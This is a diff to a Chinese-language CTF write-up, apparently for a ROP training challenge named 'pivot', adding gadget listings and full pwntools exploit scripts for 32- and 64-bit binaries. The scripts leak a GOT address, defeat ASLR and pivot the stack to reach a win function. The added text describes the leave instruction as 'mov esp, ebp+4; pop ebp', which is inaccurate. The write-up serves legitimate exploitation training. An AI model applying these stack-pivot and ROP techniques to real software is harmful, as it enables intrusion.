@@ -790,7 +790,7 @@ io.interactive()
 ```
 
 ## pivot
-这个程序有两次输入，第一次输入放在一个由 `malloc()` 函数分配的地址上，未了降低难度，特地把这个地址打印了出来，第二次的输入放在一个大小限制为 13 字节的栈上，所以我们把主要的逻辑由第一次输入，而第二次主要用于跳转到第一次的地址上。
+这个程序有两次输入，第一次输入放在一个由 `malloc()` 函数分配的地址上，未了降低难度，特地把这个地址打印了出来，第二次的输入放在一个大小限制为 13 字节的栈上，所以我们把主要的逻辑由第一次输入，而第二次主要用于跳转到第一次的地址上，这里利用了 leave 指令，即 `mov esp, ebp+4; pop ebp`。
 
 首先我们默认是开启 ASLR 的，这样共享库地址是动态的，我们需要利用 gadgets 泄露出函数 `foothold_function()` 的内存地址，通过相对位置计算得到我们的目标函数 `ret2win()` 的地址。
 ```
@@ -807,12 +807,124 @@ gdb-peda$ x/5x 0x804a024
 所以 `foothold_function()` 的 plt 地址为 `0x080485f0`，got.plt 地址为 `0x804a024`。
 
 ```
-$ ropgadget --binary pivot32 --only "mov|pop|xchg|ret|add|call"
+$ ropgadget --binary pivot32 --only "mov|pop|ret|add|call"
 ...
 0x080488c4 : mov eax, dword ptr [eax] ; ret
 0x080488c0 : pop eax ; ret
 0x08048571 : pop ebx ; ret
-0x080488c2 : xchg eax, esp ; ret
 0x080488c7 : add eax, ebx ; ret
 0x080486a3 : call eax
+```
+exp 如下：
+```python
+from pwn import *
+
+#context.log_level = 'debug'
+#context.terminal = ['konsole']
+io = process('./pivot32')
+elf = ELF('./pivot32')
+libp = ELF('./libpivot32.so')
+
+leave_ret = 0x0804889f
+
+foothold_plt     = elf.plt['foothold_function'] # 0x080485f0
+foothold_got_plt = elf.got['foothold_function'] # 0x804a024
+
+pop_eax      = 0x080488c0
+pop_ebx      = 0x08048571
+mov_eax_eax  = 0x080488c4
+add_eax_ebx  = 0x080488c7
+call_eax     = 0x080486a3
+
+foothold_sym = libp.symbols['foothold_function']
+ret2win_sym  = libp.symbols['ret2win']
+offset = int(ret2win_sym - foothold_sym) # 0x1f7
+
+leakaddr  = int(io.recv().split()[20], 16)
+
+# calls foothold_function() to populate its GOT entry, then queries that value into EAX
+#gdb.attach(io)
+payload_1 = ""
+payload_1 += p32(foothold_plt)
+payload_1 += p32(pop_eax)
+payload_1 += p32(foothold_got_plt)
+payload_1 += p32(mov_eax_eax)
+payload_1 += p32(pop_ebx)
+payload_1 += p32(offset)
+payload_1 += p32(add_eax_ebx)
+payload_1 += p32(call_eax)
+
+io.sendline(payload_1)
+
+# ebp = leakaddr-4, esp = leave_ret
+payload_2 = ""
+payload_2 += "A"*40
+payload_2 += p32(leakaddr-4) + p32(leave_ret)
+
+io.sendline(payload_2)
+
+print io.recvall()
+```
+
+下面是 64 位程序（在我的电脑上 leave_ret 的地址中含有 `0a`，所以采用 gadget 来设置 rsp，这种情况不一定有）：
+```
+$ ropgadget --binary pivot --only "mov|pop|call|add|xchg|ret"
+0x0000000000400b09 : add rax, rbp ; ret
+0x000000000040098e : call rax
+0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
+0x0000000000400b00 : pop rax ; ret
+0x0000000000400900 : pop rbp ; ret
+0x0000000000400b02 : xchg rax, rsp ; ret
+```
+```python
+from pwn import *
+
+#context.log_level = 'debug'
+#context.terminal = ['konsole']
+io = process('./pivot')
+elf = ELF('./pivot')
+libp = ELF('./libpivot.so')
+
+leave_ret = 0x0000000000400adf
+
+foothold_plt     = elf.plt['foothold_function'] # 0x400850
+foothold_got_plt = elf.got['foothold_function'] # 0x602048
+
+pop_rax      = 0x0000000000400b00
+pop_rbp      = 0x0000000000400900
+mov_rax_rax  = 0x0000000000400b05
+xchg_rax_rsp = 0x0000000000400b02
+add_rax_rbp  = 0x0000000000400b09
+call_rax     = 0x000000000040098e
+
+foothold_sym = libp.symbols['foothold_function']
+ret2win_sym  = libp.symbols['ret2win']
+offset = int(ret2win_sym - foothold_sym) # 0x14e
+
+leakaddr  = int(io.recv().split()[20], 16)
+
+# calls foothold_function() to populate its GOT entry, then queries that value into EAX
+#gdb.attach(io)
+payload_1 = ""
+payload_1 += p64(foothold_plt)
+payload_1 += p64(pop_rax)
+payload_1 += p64(foothold_got_plt)
+payload_1 += p64(mov_rax_rax)
+payload_1 += p64(pop_rbp)
+payload_1 += p64(offset)
+payload_1 += p64(add_rax_rbp)
+payload_1 += p64(call_rax)
+
+io.sendline(payload_1)
+
+# rsp = leakaddr
+payload_2 = ""
+payload_2 += "A" * 40
+payload_2 += p64(pop_rax)
+payload_2 += p64(leakaddr)
+payload_2 += p64(xchg_rax_rsp)
+
+io.sendline(payload_2)
+
+print io.recvall()
 ```
